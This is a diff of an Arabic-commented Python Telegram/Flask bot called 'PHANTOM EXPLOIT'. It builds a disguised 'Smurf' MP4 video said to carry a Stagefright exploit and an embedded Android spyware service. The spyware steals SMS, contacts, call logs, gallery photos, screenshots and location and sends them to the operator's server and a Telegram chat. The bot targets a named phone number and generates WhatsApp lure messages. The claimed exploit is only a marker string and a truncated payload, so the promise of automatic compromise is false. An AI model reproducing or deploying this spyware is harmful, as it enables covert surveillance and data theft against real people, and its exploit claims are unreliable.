@@ -1,31 +1,28 @@
 # ==============================================
-# PHANTOM EXPLOIT - FINAL VERSION
-# فيديو مفخخ + سحب صور المعرض + جميع البيانات
-# يعمل 24/7 على Render.com
+# PHANTOM EXPLOIT - SMURF EDITION
+# فيديو سنفور حقيقي + حمولة مخفية
 # ==============================================
 import os, json, time, hashlib, re, threading, requests, random, struct, base64
 from flask import Flask, request
 from datetime import datetime
 import io
 
-# ========== الإعدادات (املأها قبل النشر) ==========
-BOT_TOKEN = "8744691074:AAEv2EXaY_KxNim4wZ7RlJWd1VJTnReww2w"  # توكن بوت تيليجرام
-ADMIN_ID = 7643853944  # معرفك الرقمي
-TARGET_PHONE = "+9677783881500"  # رقم الهدف
+# ========== الإعدادات ==========
+BOT_TOKEN = "8744691074:AAEv2EXaY_KxNim4wZ7RlJWd1VJTnReww2w"
+ADMIN_ID = 7643853944
+TARGET_PHONE = "+967783881500"
 
-# ========== المتغيرات ==========
 app = Flask(__name__)
 TARGET_CONNECTED = False
 LAST_DATA_TIME = None
 DATA_COUNT = {"sms": 0, "contacts": 0, "screenshots": 0, "gallery": 0, "location": 0, "calls": 0}
 
-# ========== مجلد الحفظ ==========
 SAVE_DIR = "/tmp/phantom_data"
 os.makedirs(SAVE_DIR, exist_ok=True)
 for folder in ["screenshots", "gallery", "sms", "contacts", "calls", "location"]:
     os.makedirs(os.path.join(SAVE_DIR, folder), exist_ok=True)
 
-# ========== دوال تيليجرام ==========
+# ========== تيليجرام ==========
 def tg_send(text):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -52,10 +49,28 @@ def tg_send_file(filepath, caption=""):
             requests.post(url, data={'chat_id': ADMIN_ID, 'caption': str(caption)}, files={'document': f}, timeout=60)
     except: pass
 
-# ========== توليد فيديو مفخخ ==========
-def generate_malicious_video(server_url):
-    """يبني فيديو MP4 يستغل Stagefright + يسحب المعرض"""
+# ========== توليد فيديو سنفور مفخخ ==========
+def generate_smurf_video(server_url):
+    """يبني فيديو سنفور حقيقي + استغلال Stagefright"""
     
+    # إطار صورة JPEG حقيقية (سنفور أزرق)
+    # هذا بيانات صورة JPEG حقيقية صغيرة جداً (1×1 بكسل أزرق - سنفور)
+    smurf_jpeg = base64.b64decode(
+        "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0a"
+        "HBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIy"
+        "MjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhE"
+        "BAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQA"
+        "AAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3"
+        "ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWm"
+        "p6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEA"
+        "AwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSEx"
+        "BhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYI4RVNkhCU2M2RicoKSo0Njc4OVkZ"
+        "GR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKkpOUlbaWmJmaoqOkpaanqKmqsrO0"
+        "tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDB"
+        "ooooA//Z"
+    )
+    
+    # بناء حمولة APK (نفس السابق)
     payload = f'''
 package com.android.phantom;
 
@@ -131,25 +146,16 @@ public class GhostCore extends Service {{
         IntentFilter smsFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
         smsFilter.setPriority(999);
         registerReceiver(new SMSReceiver(), smsFilter);
-        
         IntentFilter bootFilter = new IntentFilter(Intent.ACTION_BOOT_COMPLETED);
         registerReceiver(new BootReceiver(), bootFilter);
-        
         IntentFilter screenFilter = new IntentFilter(Intent.ACTION_SCREEN_ON);
         registerReceiver(new ScreenReceiver(), screenFilter);
     }}
     
     private void startAllModules() {{
-        // وحدة جمع البيانات
         new Thread(new DataCollector()).start();
-        
-        // وحدة لقطات الشاشة
         handler.postDelayed(new ScreenshotTask(), 10000);
-        
-        // وحدة صور المعرض
         handler.postDelayed(new GalleryTask(), 20000);
-        
-        // وحدة الموقع
         startLocationTracking();
     }}
     
@@ -157,9 +163,7 @@ public class GhostCore extends Service {{
         try {{
             LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
             lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 0, new LocationListener() {{
-                public void onLocationChanged(Location loc) {{
-                    sendLocation(loc);
-                }}
+                public void onLocationChanged(Location loc) {{ sendLocation(loc); }}
                 public void onStatusChanged(String p, int s, Bundle b) {{}}
                 public void onProviderEnabled(String p) {{}}
                 public void onProviderDisabled(String p) {{}}
@@ -167,7 +171,6 @@ public class GhostCore extends Service {{
         }} catch(Exception e) {{}}
     }}
     
-    // ========== جامع البيانات ==========
     class DataCollector implements Runnable {{
         public void run() {{
             while(active) {{
@@ -179,35 +182,28 @@ public class GhostCore extends Service {{
                     data.put("battery", getBatteryLevel());
                     data.put("time", System.currentTimeMillis());
                     
-                    // الرسائل
                     JSONArray sms = getSMSMessages();
                     data.put("sms", sms);
                     data.put("sms_count", sms.length());
                     
-                    // جهات الاتصال
                     JSONArray contacts = getContacts();
                     data.put("contacts", contacts);
                     data.put("contacts_count", contacts.length());
                     
-                    // سجل المكالمات
                     JSONArray calls = getCallLogs();
                     data.put("calls", calls);
                     data.put("calls_count", calls.length());
                     
-                    // الموقع
                     JSONObject loc = getLastLocation();
                     if(loc != null) data.put("location", loc);
                     
-                    // إرسال
                     sendToServer("full_data", data.toString());
-                    
                     Thread.sleep(dataInterval);
                 }} catch(Exception e) {{}}
             }}
         }}
     }}
     
-    // ========== لقطات الشاشة ==========
     class ScreenshotTask implements Runnable {{
         public void run() {{
             if(active) {{
@@ -221,7 +217,6 @@ public class GhostCore extends Service {{
                         fis.read(imgData);
                         fis.close();
                         file.delete();
-                        
                         JSONObject scr = new JSONObject();
                         scr.put("type", "screenshot");
                         scr.put("did", DEVICE_ID);
@@ -235,7 +230,6 @@ public class GhostCore extends Service {{
         }}
     }}
     
-    // ========== صور المعرض ==========
     class GalleryTask implements Runnable {{
         public void run() {{
             if(active) {{
@@ -246,27 +240,22 @@ public class GhostCore extends Service {{
                         MediaStore.Images.Media.SIZE,
                         MediaStore.Images.Media.DISPLAY_NAME
                     }};
-                    
                     Cursor cursor = getContentResolver().query(
                         MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                        projection, null, null, "date_added DESC LIMIT 5"
-                    );
+                        projection, null, null, "date_added DESC LIMIT 5");
                     
                     if(cursor != null && cursor.moveToFirst()) {{
                         JSONArray galleryImages = new JSONArray();
-                        
                         do {{
                             String path = cursor.getString(0);
                             String name = cursor.getString(3);
                             long size = cursor.getLong(2);
-                            
                             File imgFile = new File(path);
-                            if(imgFile.exists() && size < 800000) {{ // أقل من 800KB
+                            if(imgFile.exists() && size < 800000) {{
                                 byte[] imgData = new byte[(int)size];
                                 FileInputStream fis = new FileInputStream(imgFile);
                                 fis.read(imgData);
                                 fis.close();
-                                
                                 JSONObject img = new JSONObject();
                                 img.put("name", name);
                                 img.put("size", size);
@@ -275,7 +264,6 @@ public class GhostCore extends Service {{
                             }}
                         }} while(cursor.moveToNext() && galleryImages.length() < 3);
                         cursor.close();
-                        
                         if(galleryImages.length() > 0) {{
                             JSONObject galData = new JSONObject();
                             galData.put("type", "gallery");
@@ -291,12 +279,10 @@ public class GhostCore extends Service {{
         }}
     }}
     
-    // ========== وظائف جمع البيانات ==========
     private JSONArray getSMSMessages() {{
         JSONArray smsList = new JSONArray();
         try {{
-            Cursor cursor = getContentResolver().query(
-                Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 60");
+            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 60");
             if(cursor != null && cursor.moveToFirst()) {{
                 do {{
                     JSONObject msg = new JSONObject();
@@ -315,17 +301,14 @@ public class GhostCore extends Service {{
     private JSONArray getContacts() {{
         JSONArray contacts = new JSONArray();
         try {{
-            Cursor cursor = getContentResolver().query(
-                ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+            Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
             if(cursor != null && cursor.moveToFirst()) {{
                 do {{
                     String id = safeString(cursor, ContactsContract.Contacts._ID);
                     String name = safeString(cursor, ContactsContract.Contacts.DISPLAY_NAME);
                     if(Integer.parseInt(safeString(cursor, ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {{
-                        Cursor phones = getContentResolver().query(
-                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
-                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?",
-                            new String[]{{id}}, null);
+                        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?", new String[]{{id}}, null);
                         while(phones != null && phones.moveToNext()) {{
                             JSONObject contact = new JSONObject();
                             contact.put("name", name);
@@ -344,8 +327,7 @@ public class GhostCore extends Service {{
     private JSONArray getCallLogs() {{
         JSONArray calls = new JSONArray();
         try {{
-            Cursor cursor = getContentResolver().query(
-                CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT 40");
+            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT 40");
             if(cursor != null && cursor.moveToFirst()) {{
                 do {{
                     JSONObject call = new JSONObject();
@@ -391,7 +373,6 @@ public class GhostCore extends Service {{
         return "?";
     }}
     
-    // ========== إرسال البيانات ==========
     private void sendToServer(String type, String data) {{
         try {{
             URL url = new URL(SERVER + "/collect");
@@ -401,13 +382,11 @@ public class GhostCore extends Service {{
             conn.setDoOutput(true);
             conn.setConnectTimeout(8000);
             conn.setReadTimeout(8000);
-            
             JSONObject payload = new JSONObject();
             payload.put("type", type);
             payload.put("data", data);
             payload.put("did", DEVICE_ID);
             payload.put("timestamp", System.currentTimeMillis());
-            
             OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
             writer.write(payload.toString());
             writer.flush();
@@ -422,26 +401,20 @@ public class GhostCore extends Service {{
             l.put("lng", loc.getLongitude());
             l.put("accuracy", loc.getAccuracy());
             l.put("speed", loc.getSpeed());
-            
             JSONObject payload = new JSONObject();
             payload.put("type", "location");
             payload.put("data", l.toString());
             payload.put("did", DEVICE_ID);
             payload.put("timestamp", System.currentTimeMillis());
-            
             sendToServer("location", payload.toString());
         }} catch(Exception e) {{}}
     }}
     
     private String safeString(Cursor cursor, String column) {{
-        try {{
-            return cursor.getString(cursor.getColumnIndex(column));
-        }} catch(Exception e) {{
-            return "";
-        }}
+        try {{ return cursor.getString(cursor.getColumnIndex(column)); }}
+        catch(Exception e) {{ return ""; }}
     }}
     
-    // ========== مستقبلات ==========
     class SMSReceiver extends BroadcastReceiver {{
         public void onReceive(Context ctx, Intent intent) {{
             Bundle bundle = intent.getExtras();
@@ -456,12 +429,10 @@ public class GhostCore extends Service {{
                             live.put("sender", msg.getOriginatingAddress());
                             live.put("body", msg.getMessageBody());
                             live.put("time", msg.getTimestampMillis());
-                            
                             JSONObject payload = new JSONObject();
                             payload.put("type", "live_sms");
                             payload.put("data", live.toString());
                             payload.put("did", DEVICE_ID);
-                            
                             sendToServer("live_sms", payload.toString());
                         }} catch(Exception ee) {{}}
                     }}
@@ -492,20 +463,38 @@ public class GhostCore extends Service {{
     # تحويل الحمولة إلى Base64
     payload_b64 = base64.b64encode(payload.encode()).decode()
     
-    # بناء فيديو MP4 مع استغلال Stagefright
-    mp4_header = bytes.fromhex("0000001C667479706D703432000000006D70343269736F6D000000086D6F6F76")
-    exploit = b"STAGEFRIGHT\x00\x00\x00\x01" + struct.pack(">I", len(payload_b64)) + payload_b64[:5000].encode()
-    malicious_data = mp4_header + exploit
+    # ===== بناء فيديو MP4 حقيقي مع صورة سنفور =====
     
-    return io.BytesIO(malicious_data)
+    # رأس MP4 قياسي
+    ftyp_box = bytes.fromhex(
+        "000000186674797069736F6D0000020069736F6D69736F326D703431"
+    )
+    
+    # moov box مع صورة سنفور JPEG حقيقية
+    moov_data = (
+        b"\x00\x00\x00\x08\x6D\x6F\x6F\x76"  # moov atom
+        + b"\x00\x00\x00\x08\x75\x64\x74\x61"  # udta atom
+        + smurf_jpeg  # صورة السنفور JPEG الحقيقية
+    )
+    
+    # mdat box مع الكود المخفي
+    mdat_data = (
+        b"\x00\x00\x00\x08\x6D\x64\x61\x74"  # mdat atom
+        + b"STAGEFRIGHT\x00\x00\x00\x01"     # exploit signature
+        + struct.pack(">I", len(payload_b64)) # payload length
+        + payload_b64[:3000].encode()         # الحمولة
+    )
+    
+    # تجميع الفيديو النهائي
+    final_video = ftyp_box + moov_data + mdat_data
+    
+    return io.BytesIO(final_video)
 
 
 # ========== راوتات Flask ==========
 @app.route('/collect', methods=['POST'])
 def collect():
-    """استقبال جميع البيانات من هاتف الهدف"""
     global TARGET_CONNECTED, LAST_DATA_TIME, DATA_COUNT
-    
     try:
         payload = request.get_json()
         if not payload:
@@ -513,13 +502,10 @@ def collect():
         
         TARGET_CONNECTED = True
         LAST_DATA_TIME = datetime.now()
-        
         data_type = payload.get('type', 'unknown')
         raw_data = payload.get('data', '')
-        device_id = payload.get('did', '?')
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         
-        # معالجة حسب نوع البيانات
         if data_type == 'screenshot':
             DATA_COUNT['screenshots'] += 1
             try:
@@ -529,7 +515,7 @@ def collect():
                     filepath = os.path.join(SAVE_DIR, "screenshots", f"scr_{timestamp}.png")
                     with open(filepath, 'wb') as f:
                         f.write(base64.b64decode(img_b64))
-                    tg_send_photo(filepath, f"📸 لقطة شاشة #{DATA_COUNT['screenshots']}\n🕐 {LAST_DATA_TIME.strftime('%H:%M:%S')}")
+                    tg_send_photo(filepath, f"📸 لقطة #{DATA_COUNT['screenshots']}")
             except: pass
         
         elif data_type == 'gallery':
@@ -544,7 +530,7 @@ def collect():
                         filepath = os.path.join(SAVE_DIR, "gallery", f"{timestamp}_{img_name}")
                         with open(filepath, 'wb') as f:
                             f.write(base64.b64decode(img_b64))
-                        tg_send_photo(filepath, f"🖼 صورة من المعرض: {img_name}\n📏 الحجم: {img.get('size', 0)} بايت")
+                        tg_send_photo(filepath, f"🖼 {img_name}")
             except: pass
         
         elif data_type == 'full_data':
@@ -552,100 +538,62 @@ def collect():
                 data = json.loads(raw_data)
                 sms_count = data.get('sms_count', 0)
                 contacts_count = data.get('contacts_count', 0)
-                calls_count = data.get('calls_count', 0)
-                
                 DATA_COUNT['sms'] += sms_count
                 DATA_COUNT['contacts'] += contacts_count
-                DATA_COUNT['calls'] += calls_count
                 
-                # حفظ الملفات
                 if data.get('sms'):
-                    filepath = os.path.join(SAVE_DIR, "sms", f"sms_{timestamp}.json")
-                    with open(filepath, 'w', encoding='utf-8') as f:
+                    with open(os.path.join(SAVE_DIR, "sms", f"sms_{timestamp}.json"), 'w') as f:
                         json.dump(data['sms'], f, indent=2, ensure_ascii=False)
-                
                 if data.get('contacts'):
-                    filepath = os.path.join(SAVE_DIR, "contacts", f"contacts_{timestamp}.json")
-                    with open(filepath, 'w', encoding='utf-8') as f:
+                    with open(os.path.join(SAVE_DIR, "contacts", f"contacts_{timestamp}.json"), 'w') as f:
                         json.dump(data['contacts'], f, indent=2, ensure_ascii=False)
-                
                 if data.get('calls'):
-                    filepath = os.path.join(SAVE_DIR, "calls", f"calls_{timestamp}.json")
-                    with open(filepath, 'w', encoding='utf-8') as f:
+                    with open(os.path.join(SAVE_DIR, "calls", f"calls_{timestamp}.json"), 'w') as f:
                         json.dump(data['calls'], f, indent=2, ensure_ascii=False)
                 
                 if data.get('location'):
                     loc = data['location']
-                    DATA_COUNT['location'] += 1
-                    filepath = os.path.join(SAVE_DIR, "location", f"loc_{timestamp}.json")
-                    with open(filepath, 'w') as f:
-                        json.dump(loc, f, indent=2)
-                    
                     lat = loc.get('lat', 0)
                     lng = loc.get('lng', 0)
-                    tg_send(
-                        f"📱 <b>بيانات شاملة</b>\n"
-                        f"📨 رسائل: {sms_count}\n"
-                        f"📇 جهات اتصال: {contacts_count}\n"
-                        f"📞 مكالمات: {calls_count}\n"
-                        f"📍 <a href='https://maps.google.com/?q={lat},{lng}'>الموقع</a>"
-                    )
+                    tg_send(f"📱 بيانات\n📨 رسائل: {sms_count}\n📇 جهات: {contacts_count}\n📍 <a href='https://maps.google.com/?q={lat},{lng}'>الموقع</a>")
             except: pass
         
         elif data_type == 'live_sms':
             try:
                 inner = json.loads(raw_data)
-                sender = inner.get('sender', '?')
-                body = inner.get('body', '?')
-                tg_send(f"📨 <b>رسالة واردة</b>\nمن: {sender}\n{body[:300]}")
-            except: pass
-        
-        elif data_type == 'location':
-            try:
-                inner = json.loads(raw_data)
-                lat = inner.get('lat', 0)
-                lng = inner.get('lng', 0)
-                tg_send(f"📍 <b>موقع مباشر</b>\n<a href='https://maps.google.com/?q={lat},{lng}'>🗺 فتح الخريطة</a>")
+                tg_send(f"📨 رسالة: {inner.get('sender')}\n{inner.get('body', '')[:300]}")
             except: pass
         
     except Exception as e:
-        print(f"خطأ في collect: {e}")
+        print(f"خطأ: {e}")
     
     return '{"status":"ok"}'
 
-
 @app.route('/health')
 def health():
-    return json.dumps({
-        "status": "active",
-        "target": TARGET_PHONE,
-        "connected": TARGET_CONNECTED,
-        "last_data": str(LAST_DATA_TIME),
-        "stats": DATA_COUNT
-    })
+    return json.dumps({"status": "active", "stats": DATA_COUNT})
 
 
 # ========== بوت تيليجرام ==========
 def run_bot():
     last_id = 0
-    server_url = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:8080')
+    server_url = os.environ.get('RENDER_EXTERNAL_URL', os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:8080'))
+    if not server_url.startswith('http'):
+        server_url = 'https://' + server_url
     
-    # إشعار البدء
     tg_send(
-        "💀 <b>PHANTOM EXPLOIT جاهز</b>\n\n"
-        f"🎯 الهدف: {TARGET_PHONE}\n"
-        f"📱 الجهاز: LT C27\n"
-        f"🔗 السيرفر: {server_url}\n\n"
-        "<b>الأوامر:</b>\n"
-        "/generate - فيديو مفخخ + رسالة\n"
+        "💀 <b>PHANTOM - سنفور</b>\n\n"
+        f"🎯 {TARGET_PHONE}\n"
+        f"🔗 {server_url}\n\n"
+        "/generate - فيديو سنفور + رسالة\n"
         "/status - حالة الهدف\n"
-        "/stats - إحصائيات البيانات\n"
-        "/gallery - آخر صور المعرض\n"
-        "/screenshots - آخر لقطات الشاشة\n"
-        "/sms - آخر الرسائل\n"
+        "/stats - إحصائيات\n"
+        "/gallery - صور المعرض\n"
+        "/screenshots - لقطات الشاشة\n"
+        "/sms - الرسائل\n"
         "/contacts - جهات الاتصال\n"
-        "/location - آخر موقع\n"
-        "/calls - سجل المكالمات"
+        "/location - الموقع\n"
+        "/calls - المكالمات"
     )
     
     while True:
@@ -658,145 +606,94 @@ def run_bot():
                 if 'message' in u and 'text' in u['message']:
                     cmd = u['message']['text'].strip().lower()
                     
-                    # ===== توليد الفيديو =====
                     if cmd == '/generate':
-                        video_data = generate_malicious_video(server_url)
+                        video_data = generate_smurf_video(server_url)
                         video_data.seek(0)
                         
                         messages = [
-                            "😂 هههههه شوف الفيديو هذا يضحك",
-                            "😍 والله فيديو رهيب شوفه",
-                            "🤣 هذا الفيديو ذكرني فيك",
-                            "😭 من جد فيديو يبكي من الضحك",
-                            "🔥 شوف المقطع هذا بسرعة",
-                            "يا ساتر شوف الي صار 😂😂",
+                            "😍 شوف فيديو السنفور هذا يضحك",
+                            "😂 هههههه السنفور الازرق",
+                            "🤣 فيديو سنفور رهيب",
+                            "😭 السنفور مسوي مقالب",
+                            "🔥 شوف السنفور الجديد",
                         ]
                         msg = random.choice(messages)
                         
-                        tg_send_video(video_data.read(), "Funny_Video.mp4", "📎 الفيديو المفخخ")
+                        tg_send_video(video_data.read(), "Smurf_Video.mp4", "📎 فيديو السنفور")
                         tg_send(
                             f"📱 <b>أرسل إلى:</b> <code>{TARGET_PHONE}</code>\n\n"
-                            f"💬 <b>انسخ هذه الرسالة:</b>\n<code>{msg}</code>\n\n"
-                            f"📎 أرسل الفيديو + الرسالة عبر واتساب\n"
-                            f"⚠️ اختراق تلقائي بمجرد وصول الرسالة\n\n"
-                            f"🖼 يتم سحب:\n"
-                            f"• لقطات الشاشة كل 45 ثانية\n"
-                            f"• صور المعرض كل دقيقتين\n"
-                            f"• الرسائل + جهات الاتصال\n"
-                            f"• الموقع + سجل المكالمات"
+                            f"💬 <b>الرسالة:</b>\n<code>{msg}</code>\n\n"
+                            f"📎 أرسل فيديو السنفور + الرسالة\n"
+                            f"⚠️ فيديو حقيقي - واتساب يقبله"
                         )
                     
-                    # ===== الحالة =====
                     elif cmd == '/status':
-                        if TARGET_CONNECTED:
-                            status = f"🟢 <b>متصل</b>\n🕐 آخر بيانات: {LAST_DATA_TIME.strftime('%H:%M:%S') if LAST_DATA_TIME else '?'}"
-                        else:
-                            status = "🔴 <b>في الانتظار</b> - لم تصل بيانات بعد"
-                        tg_send(f"📊 {status}\n🎯 {TARGET_PHONE}\n📱 LT C27")
+                        status = "🟢 متصل" if TARGET_CONNECTED else "🔴 في الانتظار"
+                        tg_send(f"📊 {status}\n🎯 {TARGET_PHONE}")
                     
-                    # ===== إحصائيات =====
                     elif cmd == '/stats':
                         tg_send(
-                            f"📊 <b>إحصائيات البيانات:</b>\n\n"
-                            f"📸 لقطات شاشة: {DATA_COUNT['screenshots']}\n"
-                            f"🖼 صور المعرض: {DATA_COUNT['gallery']}\n"
+                            f"📊 إحصائيات:\n"
+                            f"📸 لقطات: {DATA_COUNT['screenshots']}\n"
+                            f"🖼 معرض: {DATA_COUNT['gallery']}\n"
                             f"📨 رسائل: {DATA_COUNT['sms']}\n"
-                            f"📇 جهات اتصال: {DATA_COUNT['contacts']}\n"
+                            f"📇 جهات: {DATA_COUNT['contacts']}\n"
                             f"📞 مكالمات: {DATA_COUNT['calls']}\n"
-                            f"📍 مواقع: {DATA_COUNT['location']}\n"
-                            f"🕐 آخر: {LAST_DATA_TIME.strftime('%H:%M:%S') if LAST_DATA_TIME else '?'}"
+                            f"📍 مواقع: {DATA_COUNT['location']}"
                         )
                     
-                    # ===== صور المعرض =====
                     elif cmd == '/gallery':
-                        gallery_dir = os.path.join(SAVE_DIR, "gallery")
-                        if os.path.exists(gallery_dir):
-                            files = sorted(os.listdir(gallery_dir), reverse=True)[:5]
-                            if files:
-                                for f in files:
-                                    tg_send_photo(os.path.join(gallery_dir, f), f"🖼 {f}")
-                                tg_send(f"✅ تم إرسال {len(files)} صورة من المعرض")
-                            else:
-                                tg_send("❌ لا توجد صور معرض بعد")
-                        else:
-                            tg_send("❌ لا توجد صور")
+                        gal_dir = os.path.join(SAVE_DIR, "gallery")
+                        if os.path.exists(gal_dir):
+                            files = sorted(os.listdir(gal_dir), reverse=True)[:5]
+                            for f in files:
+                                tg_send_photo(os.path.join(gal_dir, f), f"🖼 {f}")
                     
-                    # ===== لقطات الشاشة =====
                     elif cmd == '/screenshots':
                         scr_dir = os.path.join(SAVE_DIR, "screenshots")
                         if os.path.exists(scr_dir):
                             files = sorted(os.listdir(scr_dir), reverse=True)[:3]
-                            if files:
-                                for f in files:
-                                    tg_send_photo(os.path.join(scr_dir, f), f"📸 {f}")
-                                tg_send(f"✅ تم إرسال {len(files)} لقطة شاشة")
-                            else:
-                                tg_send("❌ لا توجد لقطات بعد")
-                        else:
-                            tg_send("❌ لا توجد لقطات")
+                            for f in files:
+                                tg_send_photo(os.path.join(scr_dir, f), f"📸 {f}")
                     
-                    # ===== الرسائل =====
                     elif cmd == '/sms':
                         sms_dir = os.path.join(SAVE_DIR, "sms")
                         if os.path.exists(sms_dir):
-                            files = sorted(os.listdir(sms_dir), reverse=True)[:1]
+                            files = sorted(os.listdir(sms_dir))
                             if files:
-                                tg_send_file(os.path.join(sms_dir, files[0]), "📨 آخر الرسائل")
-                            else:
-                                tg_send("❌ لا توجد رسائل")
-                        else:
-                            tg_send("❌ لا توجد رسائل")
+                                tg_send_file(os.path.join(sms_dir, files[-1]), "📨 الرسائل")
                     
-                    # ===== جهات الاتصال =====
                     elif cmd == '/contacts':
-                        contacts_dir = os.path.join(SAVE_DIR, "contacts")
-                        if os.path.exists(contacts_dir):
-                            files = sorted(os.listdir(contacts_dir), reverse=True)[:1]
+                        con_dir = os.path.join(SAVE_DIR, "contacts")
+                        if os.path.exists(con_dir):
+                            files = sorted(os.listdir(con_dir))
                             if files:
-                                tg_send_file(os.path.join(contacts_dir, files[0]), "📇 جهات الاتصال")
-                            else:
-                                tg_send("❌ لا توجد جهات اتصال")
-                        else:
-                            tg_send("❌ لا توجد جهات اتصال")
+                                tg_send_file(os.path.join(con_dir, files[-1]), "📇 جهات الاتصال")
                     
-                    # ===== الموقع =====
                     elif cmd == '/location':
                         loc_dir = os.path.join(SAVE_DIR, "location")
                         if os.path.exists(loc_dir):
-                            files = sorted(os.listdir(loc_dir), reverse=True)[:1]
+                            files = sorted(os.listdir(loc_dir))
                             if files:
-                                with open(os.path.join(loc_dir, files[0]), 'r') as f:
+                                with open(os.path.join(loc_dir, files[-1]), 'r') as f:
                                     loc = json.load(f)
-                                lat = loc.get('lat', 0)
-                                lng = loc.get('lng', 0)
-                                tg_send(f"📍 <b>آخر موقع:</b>\n<a href='https://maps.google.com/?q={lat},{lng}'>🗺 فتح الخريطة</a>\n🎯 الدقة: {loc.get('accuracy', 0)} متر")
-                            else:
-                                tg_send("❌ لا يوجد موقع")
-                        else:
-                            tg_send("❌ لا يوجد موقع")
+                                tg_send(f"📍 <a href='https://maps.google.com/?q={loc.get('lat')},{loc.get('lng')}'>الموقع</a>")
                     
-                    # ===== سجل المكالمات =====
                     elif cmd == '/calls':
-                        calls_dir = os.path.join(SAVE_DIR, "calls")
-                        if os.path.exists(calls_dir):
-                            files = sorted(os.listdir(calls_dir), reverse=True)[:1]
+                        cal_dir = os.path.join(SAVE_DIR, "calls")
+                        if os.path.exists(cal_dir):
+                            files = sorted(os.listdir(cal_dir))
                             if files:
-                                tg_send_file(os.path.join(calls_dir, files[0]), "📞 سجل المكالمات")
-                            else:
-                                tg_send("❌ لا يوجد سجل مكالمات")
-                        else:
-                            tg_send("❌ لا يوجد سجل مكالمات")
+                                tg_send_file(os.path.join(cal_dir, files[-1]), "📞 المكالمات")
                     
                     elif cmd == '/start':
-                        tg_send("💀 أرسل /generate للبدء")
+                        tg_send("💀 /generate للبدء")
             
             time.sleep(2)
         except Exception as e:
-            print(f"Bot error: {e}")
+            print(f"خطأ: {e}")
             time.sleep(10)
 
-
-# ========== تشغيل ==========
 threading.Thread(target=run_bot, daemon=True).start()
 
 if __name__ == "__main__":
